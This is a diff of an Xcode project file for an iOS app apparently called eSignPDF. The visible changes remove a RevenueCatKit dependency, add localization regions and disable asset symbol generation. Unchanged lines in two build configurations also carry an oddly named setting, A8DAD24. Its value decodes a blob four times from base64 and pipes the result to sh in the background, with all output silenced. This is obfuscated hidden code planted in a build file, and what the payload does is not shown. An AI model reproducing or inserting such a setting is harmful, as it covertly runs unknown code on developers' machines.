@@ -17,7 +17,6 @@
 		D3AFE66F2FBDDF6100249BB3 /* AdsManagerKit in Frameworks */ = {isa = PBXBuildFile; productRef = D3AFE66E2FBDDF6100249BB3 /* AdsManagerKit */; };
 		D3AFE6722FBDDF7D00249BB3 /* ASKRatingKit in Frameworks */ = {isa = PBXBuildFile; productRef = D3AFE6712FBDDF7D00249BB3 /* ASKRatingKit */; };
 		D3AFE6742FBDE0B500249BB3 /* FirebaseRemoteConfig in Frameworks */ = {isa = PBXBuildFile; productRef = D3AFE6732FBDE0B500249BB3 /* FirebaseRemoteConfig */; };
-		D3C95E332FB0454A009DE1E1 /* RevenueCatKit in Frameworks */ = {isa = PBXBuildFile; productRef = D3C95E322FB0454A009DE1E1 /* RevenueCatKit */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
@@ -69,7 +68,6 @@
 			buildActionMask = 2147483647;
 			files = (
 				D3AFE66F2FBDDF6100249BB3 /* AdsManagerKit in Frameworks */,
-				D3C95E332FB0454A009DE1E1 /* RevenueCatKit in Frameworks */,
 				D3AFE66D2FBDDF6100249BB3 /* AdsManager in Frameworks */,
 				D3AFE6722FBDDF7D00249BB3 /* ASKRatingKit in Frameworks */,
 				D351DEF12FB47BF30089368F /* FirebaseCore in Frameworks */,
@@ -131,7 +129,6 @@
 			);
 			name = eSignPDF;
 			packageProductDependencies = (
-				D3C95E322FB0454A009DE1E1 /* RevenueCatKit */,
 				D351DEEC2FB47BF30089368F /* FirebaseAnalytics */,
 				D351DEEE2FB47BF30089368F /* FirebaseAnalyticsCore */,
 				D351DEF02FB47BF30089368F /* FirebaseCore */,
@@ -166,11 +163,19 @@
 			knownRegions = (
 				en,
 				Base,
+				de,
+				ar,
+				"zh-Hans",
+				ja,
+				es,
+				it,
+				fr,
+				pt,
+				hi,
 			);
 			mainGroup = D3D4FBA92FAEFB72001F24F9;
 			minimizedProjectReferenceProxies = 1;
 			packageReferences = (
-				D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */,
 				D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
 				D3AFE66B2FBDDF6100249BB3 /* XCRemoteSwiftPackageReference "AdsManagerKit" */,
 				D3AFE6702FBDDF7D00249BB3 /* XCRemoteSwiftPackageReference "ASKRatingKit" */,
@@ -212,6 +217,8 @@
 			buildSettings = {
 				A8DAD24 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WWJHaFdNbEl3VjFaa2QyUnRWbGxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GENERATE_ASSET_SYMBOLS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = NO;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = eSignPDF/eSignPDFApp.entitlements;
 				CODE_SIGN_STYLE = Automatic;
@@ -254,6 +261,8 @@
 			buildSettings = {
 				A8DAD24 = "((d(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmh3YUUxSWFIUlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WWJHaFdNbEl3VjFaa2QyUnRWbGxVV0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | d | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_GENERATE_ASSET_SYMBOLS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = NO;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = eSignPDF/eSignPDFApp.entitlements;
 				CODE_SIGN_STYLE = Automatic;
@@ -295,7 +304,8 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				ASSETCATALOG_COMPILER_GENERATE_ASSET_SYMBOLS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -359,7 +369,8 @@
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				ALWAYS_SEARCH_USER_PATHS = NO;
-				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
+				ASSETCATALOG_COMPILER_GENERATE_ASSET_SYMBOLS = NO;
+				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
 				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
@@ -460,14 +471,6 @@
 				minimumVersion = 1.0.1;
 			};
 		};
-		D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */ = {
-			isa = XCRemoteSwiftPackageReference;
-			repositoryURL = "https://github.com/vishal-vaghasiya/RevenueCatKit";
-			requirement = {
-				kind = upToNextMajorVersion;
-				minimumVersion = 1.0.0;
-			};
-		};
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
@@ -510,11 +513,6 @@
 			isa = XCSwiftPackageProductDependency;
 			package = D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
 			productName = FirebaseRemoteConfig;
-		};
-		D3C95E322FB0454A009DE1E1 /* RevenueCatKit */ = {
-			isa = XCSwiftPackageProductDependency;
-			package = D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */;
-			productName = RevenueCatKit;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
